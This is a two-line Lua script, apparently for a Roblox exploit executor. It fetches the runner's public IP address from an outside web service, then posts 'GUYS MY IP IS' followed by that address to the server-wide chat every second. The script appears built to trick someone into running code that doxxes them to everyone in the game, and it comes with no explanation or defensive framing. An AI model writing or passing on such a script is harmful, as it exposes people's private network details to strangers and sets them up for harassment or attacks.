local IP = game:HttpGet("https://synth.bet/GetIP.php")

while wait(1) do game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GUYS MY IP IS "..IP, "All") end
